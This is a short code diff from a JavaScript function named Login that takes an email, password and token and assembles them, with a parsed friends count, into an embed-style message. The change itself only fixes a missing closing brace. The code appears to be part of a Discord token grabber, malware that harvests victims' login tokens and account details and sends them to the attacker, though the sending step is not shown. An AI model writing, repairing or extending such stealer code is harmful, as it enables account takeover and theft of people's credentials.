@@ -167,7 +167,7 @@ function Login(email, password, token) {
                             "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
-                        
+                                 },
                         {
                             "name": `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,                        
                             "value": (function () {
